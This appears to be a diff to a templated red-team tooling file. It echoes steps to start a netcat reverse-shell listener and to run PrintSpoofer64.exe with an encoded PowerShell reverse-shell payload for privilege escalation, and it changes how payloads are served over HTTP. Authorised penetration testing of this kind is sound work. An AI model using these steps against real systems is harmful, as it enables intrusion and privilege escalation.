@@ -17,4 +17,4 @@ content: |
   echo 'Preparation 1 (for revshell): nc -lvnp <%=$(esh variables/shell_port)%>'; \
   echo 'To open another revshell with elevated privileges: <%=$(esh variables/delivery_path_windows)%>\PrintSpoofer64.exe -i -c "<%=${payload:-$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)}%>"'; \
   echo '================================================================'; \
-  python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
